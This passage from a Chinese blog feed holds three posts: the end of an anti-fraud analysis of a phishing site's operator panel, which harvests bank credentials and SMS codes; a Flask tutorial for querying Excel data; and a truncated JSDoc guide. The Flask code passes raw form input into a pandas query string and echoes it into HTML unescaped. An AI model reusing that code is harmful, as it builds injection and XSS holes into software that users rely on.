alt="front-res-1-pass-kill"></p><h4 id="“验证码超时失效，请返回重新获取（不显示金额）”"><a href="#“验证码超时失效，请返回重新获取（不显示金额）”" class="headerlink" title="“验证码超时失效，请返回重新获取（不显示金额）”"></a>“验证码超时失效，请返回重新获取（不显示金额）”</h4><p>如果你这边操作慢了，导致骗子那边输入超时，就会提示让你重新操作获取提交一次（想的真周到=_=）：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4401d74a6bb02fc2179f63aa20b6060c.png" alt="front-res-2-msg-timeout"></p><h4 id="“通过-【显示余额】”"><a href="#“通过-【显示余额】”" class="headerlink" title="“通过=【显示余额】”"></a>“通过=【显示余额】”</h4><p>只是不是有提供余额信息嘛，这里就提供用户确认再次骗取二维码（让人觉得像是银行正常查询出来的）：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/76c932f4bc92ba7f8c3df8a507d12a0e.png" alt="front-res-3-pass-show-amount"></p><h4 id="“余额查询”"><a href="#“余额查询”" class="headerlink" title="“余额查询”"></a>“余额查询”</h4><p>如果骗子那边执行什么操作核实到金额不对时，就是提示用户重新填写正确金额：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/233d3f61f7c9e8838e31b09c98164085.png" alt="front-res-4-amount-query-1"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/6a37878617da6ce171ce74b980c95f22.png" alt="front-res-4-amount-query-2"></p><h4 id="“取款密码错误”"><a href="#“取款密码错误”" class="headerlink" title="“取款密码错误”"></a>“取款密码错误”</h4><p>如果发现取款密码不对，也会重新让用户提供：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b27181153c17dedd8c2004b229bd2a1e.png" alt="front-res-5-withdraw-passwd-wrong-1"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/b80034ee8786eb9957df30df0810593e.png" alt="front-res-5-withdraw-passwd-wrong-2"></p><h4 id="“手机号码错误”"><a href="#“手机号码错误”" class="headerlink" title="“手机号码错误”"></a>“手机号码错误”</h4><p>然后是手机号：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0b83bb06d879b9264d132bd281fc5ce4.png" alt="front-res-6-phone-wrong-1"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/e216f8b499a1ce91ea0edfcfa2708dd0.png" alt="front-res-6-phone-wrong-2"></p><h4 id="“银行卡号错误”"><a href="#“银行卡号错误”" class="headerlink" title="“银行卡号错误”"></a>“银行卡号错误”</h4><p>银行卡号：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0c64ceaaa55c15044484607369328858.png" alt="front-res-7-bank-wrong-1"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/63ab797f3cab5f5ccfe6ff5ce73f827f.png" alt="front-res-7-bank-wrong-2"></p><h4 id="“身份证号错误”"><a href="#“身份证号错误”" class="headerlink" title="“身份证号错误”"></a>“身份证号错误”</h4><p>姓名和身份证号：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/42efd2d2b7fd97de9a1a015359f0b041.png" alt="front-res-8-name-id-wrong-1"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/a425ec7a8f554491be9e35be638bb731.png" alt="front-res-8-name-id-wrong-2"></p><h4 id="“审核通过”"><a href="#“审核通过”" class="headerlink" title="“审核通过”"></a>“审核通过”</h4><p>然后是审核通过，让你耐心等待结果（等待骗子把钱套走跑路 $_$）：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/cd354a0f5f818ccb57e2931d65c54790.png" alt="front-res-9-pass-over"></p><h4 id="“不支持，请更换名下其他银行认证”"><a href="#“不支持，请更换名下其他银行认证”" class="headerlink" title="“不支持，请更换名下其他银行认证”"></a>“不支持，请更换名下其他银行认证”</h4><p>如果发现某些银行卡不太好利用，就会提示更换：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ecf1b09a0cc65a00b0e756d11418b85d.png" alt="front-res-10-not-support-bank"></p><h4 id="“换【信用卡】”"><a href="#“换【信用卡】”" class="headerlink" title="“换【信用卡】”"></a>“换【信用卡】”</h4><p>换信用卡：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/db3067f12a484765e1e9372be6bfd8d7.png" alt="front-res-11-change-credit-card"></p><h4 id="“换【储蓄卡】”"><a href="#“换【储蓄卡】”" class="headerlink" title="“换【储蓄卡】”"></a>“换【储蓄卡】”</h4><p>换储蓄卡，反正对方为了达到目的，会反复榨干你的每一处积蓄，比大多数服务业都贴心……</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d35775e7c994ce1cc0048f73acc7204d.png" alt="front-res-12-change-debit-card"></p><h4 id="“有效期和后三位-错误”"><a href="#“有效期和后三位-错误”" class="headerlink" title="“有效期和后三位/错误”"></a>“有效期和后三位/错误”</h4><p>然后这个是信用卡相关的信息，和密码一样重要，也要注意不要轻易透露出去：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8f9e6256425b7fcac00fe1e7cca1e653.png" alt="front-res-13-change-valid-date-1"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/0d8c986622de04ca55e7f0e8d200ffd8.png" alt="front-res-13-change-valid-date-2"></p><h4 id="“【建设银行】-获取授权码”"><a href="#“【建设银行】-获取授权码”" class="headerlink" title="“【建设银行】==获取授权码”"></a>“【建设银行】==获取授权码”</h4><p>使用建设银行应该是需要额外的授权码，骗子也会想办法搞到手：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/652d271bdda2f34a3a1cba0afd1f32d8.png" alt="front-res-14-ccb-auth-code-1"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/0a3b50bb0a80c3b48cb46035f8975b22.png" alt="front-res-14-ccb-auth-code-2"></p><h4 id="“【网银密码】”"><a href="#“【网银密码】”" class="headerlink" title="“【网银密码】”"></a>“【网银密码】”</h4><p>如果存在网银，也会骗取登录密码进行远程套现：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4c703e61b4c6792f672eef7024e9afb6.png" alt="front-res-15-input-ebank-passwd-1"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/a5565b24c4e3cd0cd37454fc3e23cd3c.png" alt="front-res-15-input-ebank-passwd-2"></p><h4 id="“请保持银行卡内余额大于5000验证”"><a href="#“请保持银行卡内余额大于5000验证”" class="headerlink" title="“请保持银行卡内余额大于5000验证”"></a>“请保持银行卡内余额大于5000验证”</h4><p>下面的就有意思了，如果骗子觉得你卡内金额太少（穷），就会提示你再多搞点过来：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/cc4c260b50b9d06fca93957062d40925.png" alt="front-res-16-need-account-5000"></p><h4 id="“请保持银行卡内余额大于10000验证”"><a href="#“请保持银行卡内余额大于10000验证”" class="headerlink" title="“请保持银行卡内余额大于10000验证”"></a>“请保持银行卡内余额大于10000验证”</h4><p>或者骗子心情好，来个狮子大开口：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8b5c784332ba5e3ac5f6724e1351d1e5.png" alt="front-res-17-need-account-10000"></p><h4 id="“验证码超时失效，请返回重新获取（显示余额）”"><a href="#“验证码超时失效，请返回重新获取（显示余额）”" class="headerlink" title="“验证码超时失效，请返回重新获取（显示余额）”"></a>“验证码超时失效，请返回重新获取（显示余额）”</h4><p>然后这是验证码超时提示金额，和之前差不多：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0d4b6b835706b0b6c4929f86bbf39ca4.png" alt="front-res-18-msg-timeout-show-amount-1"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/85e284ef7d1a546abca2bce79cbd751f.png" alt="front-res-18-msg-timeout-show-amount-2"></p><h4 id="“只支持工、平、浦、招、光储蓄卡”"><a href="#“只支持工、平、浦、招、光储蓄卡”" class="headerlink" title="“只支持工、平、浦、招、光储蓄卡”"></a>“只支持工、平、浦、招、光储蓄卡”</h4><p>这里本来应该是提示支持指定银行，不过……看来天下开发者总是有不同的环境，类似的处境，唉，同情那位仁兄3秒：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4732597d584865971124561f0c5675f3.png" alt="front-res-19-only-support-some-banks"></p><h4 id="“下载-apk-拦截马”"><a href="#“下载-apk-拦截马”" class="headerlink" title="“下载 apk 拦截马”"></a>“下载 apk 拦截马”</h4><p>这里也一样，本来该骗用户下载安卓木马的，但似乎也还没准备好：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/97201804b14a81921335c93a403eebec.png" alt="front-res-20-download-apk-trojan-1"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/bea6a15e95cd6868135ad8a2b48691d4.png" alt="front-res-20-download-apk-trojan-2"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/cf95e17fdb5d6ecc154f03bef8eecc74.png" alt="front-res-20-download-apk-trojan-3"></p><h4 id="“联系在线客服”"><a href="#“联系在线客服”" class="headerlink" title="“联系在线客服”"></a>“联系在线客服”</h4><p>一样：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/de5a92cf27f20b78ad4d32f54f9686ee.png" alt="front-res-21-contact-online-service"></p><h4 id="“信息不一致，请返回从新填写正确的预留信息”"><a href="#“信息不一致，请返回从新填写正确的预留信息”" class="headerlink" title="“信息不一致，请返回从新填写正确的预留信息”"></a>“信息不一致，请返回从新填写正确的预留信息”</h4><p>察觉用户输入信息不一致，重新填写：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/2e476cb247aa61b42922aad75dcbb3a9.png" alt="front-res-22-info-inconsistent"></p><h4 id="“扣款–打枪”"><a href="#“扣款–打枪”" class="headerlink" title="“扣款–打枪”"></a>“扣款–打枪”</h4><p>这里也有意思，基本就是骗子已经从用户手上套现了，为了安抚民心，整这一大段话提示用户这是流程的基本操作，以及后续会返还之类的（信你个gui）：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/761aa09a90ce5747ad3ef28c170e5d09.png" alt="front-res-23-stole-money-1"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/aafb5db1dbff49e1891b249f8d25e58a.png" alt="front-res-23-stole-money-2"></p><h4 id="“【先回复打字，再设置此功能键】”"><a href="#“【先回复打字，再设置此功能键】”" class="headerlink" title="“【先回复打字，再设置此功能键】”"></a>“【先回复打字，再设置此功能键】”</h4><p>然后这是最后一项了，大致就是骗子自己编话术，然后返回提示用户：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ff7623fcbfd9d69aea5747f1fe30a3de.png" alt="front-res-24-self-define-reply-backend"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/f4b8fedfd6d6b90e7e4357484a21ab23.png" alt="front-res-24-self-define-reply"></p><h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05 结语"></a>0x05 结语</h2><p>正道的光可以迟到，但不能缺席，由于目前所收集的诈骗团伙相关信息还并不充分，后续会想办法陆陆续续收集，再交由警方处理<br><img src="https://img-blog.csdnimg.cn/img_convert/c986e76962610c5d42e6e7c7df0a0c1f.png" alt="zhapian-jubao-online"></p><p>最后呢，其实也并没有什么额外要说的，因为防骗或安全意识这些大道理，国家政府再到媒体个人，每天都在强调，稍微留心一下就行了，从这整个过程看来（攻克过程不重要，可以忽略），贬义的讲，骗子考虑业务场景还挺周到的，也有不少地方在利用人的弱点，就比如之前图中那些接近官方的环境和话语，大家还是得注意分辨；</p><p>然后就是最最重要的，因为那封邮件是一切的开端，注意提高账户密保和安全性是一方面，比如加个登录二次验证什么的，另一方面就是不要轻信任何信息，涉及链接或二维码这些的，即使来自身边熟悉的人，因为他们可能也只是受害者链上的一个节点而已。</p><p><img src="https://img-blog.csdnimg.cn/99bc130c6497435fb14f3a2a06724125.jpg" alt="country-fanzha"></p><p>另外，额外宣传一波 (¬‿¬)，国家出台的反诈中心APP，除了风险检测与线上举报外，更有相当多的真实案例公布更新，可下载备用。</p>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit hack 渗透 安全 诈骗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过Python制作网页查询Excel数据</title>
      <link href="/2024/09/27/qi-ta/tong-guo-python-zhi-zuo-wang-ye-cha-xun-excel-shu-ju/"/>
      <url>/2024/09/27/qi-ta/tong-guo-python-zhi-zuo-wang-ye-cha-xun-excel-shu-ju/</url>
      
        <content type="html"><![CDATA[<h3 id="通过Python制作网页查询Excel数据"><a href="#通过Python制作网页查询Excel数据" class="headerlink" title="通过Python制作网页查询Excel数据"></a>通过Python制作网页查询Excel数据</h3><h2 id="1-Excel文件：D-Python-Project-test-奖牌榜-xlsx，和Python代码在同一目录"><a href="#1-Excel文件：D-Python-Project-test-奖牌榜-xlsx，和Python代码在同一目录" class="headerlink" title="1.Excel文件：D:\Python_Project\test\奖牌榜.xlsx，和Python代码在同一目录"></a>1.Excel文件：D:\Python_Project\test\奖牌榜.xlsx，和Python代码在同一目录</h2><p><img src="https://img2020.cnblogs.com/blog/1837851/202201/1837851-20220108230252678-173634989.png" alt="images"></p><p><img src="https://img2020.cnblogs.com/blog/1837851/202201/1837851-20220108230317990-1607828126.png" alt="images">]</p><h2 id="2-代码test2-py："><a href="#2-代码test2-py：" class="headerlink" title="2.代码test2.py："></a>2.代码test2.py：</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flask<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">from</span> flask <span class="token keyword">import</span> requestapp <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/query"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">query_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_excel<span class="token punctuation">(</span><span class="token string">"奖牌榜.xlsx"</span><span class="token punctuation">)</span>    medal_data <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>    country_name <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"country_name"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> country_name<span class="token punctuation">:</span>        medal_data <span class="token operator">=</span> df<span class="token punctuation">.</span>query<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"国家 == '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>country_name<span class="token punctuation">&#125;</span></span><span class="token string">'"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"""        &lt;html>&lt;body style="text-align:center">        &lt;h3>查询奖牌信息&lt;/h3>        &lt;form action="/query" method="post">            国家：&lt;input type="text" name="country_name" value="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>country_name<span class="token punctuation">&#125;</span></span><span class="token string">">            &lt;input type="submit" name="submit" value="查询">        &lt;/form>        &lt;center> %s &lt;/center>        &lt;/body>&lt;/html>    """</span></span> <span class="token operator">%</span> medal_data<span class="token punctuation">.</span>to_html<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">9999</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-运行："><a href="#3-运行：" class="headerlink" title="3.运行："></a>3.运行：</h2><p><img src="https://img2020.cnblogs.com/blog/1837851/202201/1837851-20220108230337990-1292105602.png" alt="images"></p><h2 id="4-验证："><a href="#4-验证：" class="headerlink" title="4.验证："></a>4.验证：</h2><p>（1）查看9999端口的占用情况：<br>    <pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">netstat <span class="token operator">-</span>ano <span class="token punctuation">|</span> findstr <span class="token string">"9999"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>（2）查看PID对应的进程：<br>    <pre class="line-numbers language-poweshell" data-language="poweshell"><code class="language-poweshell">tasklist | findstr &quot;1480&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p><img src="https://img2020.cnblogs.com/blog/1837851/202201/1837851-20220108230348502-1066586872.png" alt="images"></p><p>（3）浏览器访问：192.168.0.100:9999/query</p><p><img src="https://img2020.cnblogs.com/blog/1837851/202201/1837851-20220108230403509-1223871112.png" alt="images"></p><p><img src="https://img2020.cnblogs.com/blog/1837851/202201/1837851-20220108230410500-256908978.png" alt="images"></p><p><img src="https://img2020.cnblogs.com/blog/1837851/202201/1837851-20220108230416238-1249719073.png" alt="images"></p><h2 id="备注："><a href="#备注：" class="headerlink" title="备注："></a>备注：</h2><h2 id="1、Excel文件需要和python代码放在同一目录下才可以使用相对路径表示"><a href="#1、Excel文件需要和python代码放在同一目录下才可以使用相对路径表示" class="headerlink" title="1、Excel文件需要和python代码放在同一目录下才可以使用相对路径表示"></a>1、Excel文件需要和python代码放在同一目录下才可以使用相对路径表示</h2><h2 id="2、-query为浏览器访问时输入的路径"><a href="#2、-query为浏览器访问时输入的路径" class="headerlink" title="2、/query为浏览器访问时输入的路径"></a>2、/query为浏览器访问时输入的路径</h2><h2 id="3、IP地址192-168-0-100为Windows本机内网IP地址"><a href="#3、IP地址192-168-0-100为Windows本机内网IP地址" class="headerlink" title="3、IP地址192.168.0.100为Windows本机内网IP地址"></a>3、IP地址192.168.0.100为Windows本机内网IP地址</h2><h2 id="4、app-run-host-”0-0-0-0”-port-9999-：监听本机所有地址的9999端口"><a href="#4、app-run-host-”0-0-0-0”-port-9999-：监听本机所有地址的9999端口" class="headerlink" title="4、app.run(host=”0.0.0.0”, port=9999)：监听本机所有地址的9999端口"></a>4、app.run(host=”0.0.0.0”, port=9999)：监听本机所有地址的9999端口</h2><h2 id="5、程序执行过程中其它依赖软件包的安装方法："><a href="#5、程序执行过程中其它依赖软件包的安装方法：" class="headerlink" title="5、程序执行过程中其它依赖软件包的安装方法："></a>5、程序执行过程中其它依赖软件包的安装方法：</h2><p>（1）“文件”–&gt;“设置”–&gt;“项目：当前项目”–&gt;“Python解释器”–&gt;“+”进行软件包安装</p><p>（2）通过CMD命令提示符使用pip命令进行安装，需要注意的是，PyCharm中的环境和pip所在的环境可能不是同一个环境，pip安装的软件包可能在Python的原生环境中，而PyCharm中所用的却是虚拟环境（PyCharm在安装过程中会提示用户是否安装虚拟环境），需要将pip安装好的软件包拷贝至虚拟环境中才能生效。</p><h2 id="6、PyCharm中软件包安装慢的解决方法："><a href="#6、PyCharm中软件包安装慢的解决方法：" class="headerlink" title="6、PyCharm中软件包安装慢的解决方法："></a>6、PyCharm中软件包安装慢的解决方法：</h2><p>“文件”–&gt;“设置”–&gt;“项目：当前项目”–&gt;“Python解释器”–&gt;“+”–&gt;“管理仓库”–&gt;“+”–&gt;添加阿里云的仓库地址<a href="https://mirrors.aliyun.com/pypi/simple/">https://mirrors.aliyun.com/pypi/simple/</a></p><h2 id="7、如果是在Linux中执行代码："><a href="#7、如果是在Linux中执行代码：" class="headerlink" title="7、如果是在Linux中执行代码："></a>7、如果是在Linux中执行代码：</h2><p>（1）后台运行：<br>    <pre class="line-numbers language-poweshell" data-language="poweshell"><code class="language-poweshell">nohup &#x2F;usr&#x2F;bin&#x2F;python -u &#x2F;python&#x2F;test&#x2F;test2.py &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>（2）查看9999端口的占用情况：<br>    <pre class="line-numbers language-none"><code class="language-none">ss -tunlp | grep 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit python 编程 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript之注释规范化（JSDoc）</title>
      <link href="/2024/09/27/javascript/javascript-zhi-zhu-shi-gui-fan-hua/"/>
      <url>/2024/09/27/javascript/javascript-zhi-zhu-shi-gui-fan-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>俗话说，无规矩不成方圆；虽说代码敲出来都是交给编译器解释执行的，只要不存在语法格式错误，排版无论多么反人类都是没有问题的，但是代码除了执行外的另一个广泛用途就是阅读了，翻阅自己过去的代码、理解别人的源码，等等；所以出现了代码风格化，美化外观的同时便于阅读，这就是目前 JSLint 等工具的作用；</p><p>当然，除了代码本身外，阅读更多的可能就是代码注释了，注释本身是不会被编译器编译执行的，其作用也是为了留下一些信息，方便更好的理解代码本身；所以，注释的规范化也是一个值得思考的问题；而接下来即将介绍的 <strong>JSDoc</strong> 就是这样的一款工具；</p><h2 id="JSDoc"><a href="#JSDoc" class="headerlink" title="JSDoc"></a>JSDoc</h2><p>根据其官网（<a href="https://jsdoc.app/index.html">https://jsdoc.app/index.html</a>）的介绍，JSDoc 是一个针对 JavaScript 的 API 文档生成器，类似于 Java 中的 Javadoc 或者 PHP 中的 phpDocumentor；在源代码中添加指定格式的注释，JSDoc 工具便会自动扫描你的代码并生成一个 API 文档网站（在指定目录下生成相关的网页文件）；</p><p>生成 API 文档只是一方面，其更主要的贡献在于对代码注释格式进行了规范化，你可能没用过，但多半曾经在某个地方的源码中见过类似于下面的注释格式：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * Returns the sum of a and b * @param &#123;number&#125; a * @param &#123;number&#125; b * @returns &#123;number&#125; */</span><span class="token keyword">function</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>工具的使用很简单，首先安装它：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">-g</span> jsdoc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其次假设在一个名为 <code>doc.js</code> 的文件中书写以下代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * Returns the sum of a and b * @param &#123;number&#125; a * @param &#123;number&#125; b * @returns &#123;number&#125; */</span><span class="token keyword">function</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * Return the diff fo a and b * @param &#123;number&#125; a * @param &#123;number&#125; b * @returns &#123;number&#125; */</span><span class="token keyword">function</span> <span class="token function">diff</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> a <span class="token operator">-</span> b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就是在当前目录执行以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">jsdoc doc.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后就会在当前目录下生成一个名为 <code>out</code> 的目录（也可以另外指定），当前目录内容就会变成像下面这样：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">├── doc.js└── out    ├── index.html    ├── doc.js.html    ├── global.html    ├── fonts    │   ├── OpenSans-BoldItalic-webfont.eot     │   ├── OpenSans-BoldItalic-webfont.svg     │   ├── OpenSans-BoldItalic-webfont.woff    │   ├── OpenSans-Bold-webfont.eot           │   ├── OpenSans-Bold-webfont.svg           │   ├── OpenSans-Bold-webfont.woff          │   ├── OpenSans-Italic-webfont.eot         │   ├── OpenSans-Italic-webfont.svg         │   ├── OpenSans-Italic-webfont.woff        │   ├── OpenSans-LightItalic-webfont.eot    │   ├── OpenSans-LightItalic-webfont.svg    │   ├── OpenSans-LightItalic-webfont.woff    │   ├── OpenSans-Light-webfont.eot    │   ├── OpenSans-Light-webfont.svg    │   ├── OpenSans-Light-webfont.woff    │   ├── OpenSans-Regular-webfont.eot    │   ├── OpenSans-Regular-webfont.svg    │   └── OpenSans-Regular-webfont.woff    ├── scripts    │   ├── linenumber.js    │   └── prettify    │       ├── Apache-License-2.0.txt    │       ├── lang-css.js    │       └── prettify.js    └── styles        ├── jsdoc-default.css        ├── prettify-jsdoc.css        └── prettify-tomorrow.css<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过浏览器访问这个 <code>out</code> 目录中的相关网页，就会展示类似于下面的页面内容；</p><p>主页：</p><p><img src="https://i.loli.net/2020/03/13/i4qVtlwaCIEWjAp.png" alt="jsdoc-home.png"></p><p>指定函数页：</p><p><img src="https://i.loli.net/2020/03/13/1Va8cR9YybirWIO.png" alt="jsdoc-func.png"></p><p>网页样式模板也可以更换，根据命令行参数修改即可，这里不再探究，下面主要来学习一下它的注释格式；</p><h3 id="注释格式"><a href="#注释格式" class="headerlink" title="注释格式"></a>注释格式</h3><p>完整的格式介绍请参考官网（<a href="https://jsdoc.app/index.html">https://jsdoc.app/index.html</a>），目前版本是 JSDoc 3，下面只介绍几种常用的标签并配合举例；当然如果嫌手写一堆标签麻烦，现在许多编辑器（比如 VS Code）都提供了相关的插件下载，直接在插件中搜索关键词 jsdoc 就会出现许多，都是带提示或者自动识别当前代码生成的，很方便；</p><h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><p>JSDoc 使用以下格式的注释符来对要添加的标签进行块级包裹：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** *  *  */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>即星号列垂直对其，第一行使用两个星号，每个星号后要添加一个空格再写内容，比如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * 前面留一个空格，再写描述 * 或者多行描述 * @param &#123;number&#125; 关于该参数的描述 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>行内包裹：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** @function */</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="description"><a href="#description" class="headerlink" title="@description"></a>@description</h4><p>也可写作 <code>@desc</code>，描述当前注释对象的详细信息；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * @function * @description 关于该函数的介绍内容 */</span><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * 也能在这里直接写介绍内容 * @function * @description 如果这里又继续使用标签添加内容，则会覆盖第一行的介绍内容 */</span><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="file"><a href="#file" class="headerlink" title="@file"></a>@file</h4><p>注释写在文件开头，用于描述当前文件的相关信息；例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * @file 这是一个用于...的文件，包含了...功能 */</span> <span class="token comment">// 然后是代码正文...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="author"><a href="#author" class="headerlink" title="@author"></a>@author</h4><p>描述当前文件或者代码的作者的相关信息；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * @author Jack &lt;jack@example.com> */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="copyright"><a href="#copyright" class="headerlink" title="@copyright"></a>@copyright</h4><p>描述当前文件的版权相关信息</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * @copyright Jack 2020 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="license"><a href="#license" class="headerlink" title="@license"></a>@license</h4><p>描述当前文件许可证相关信息；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token 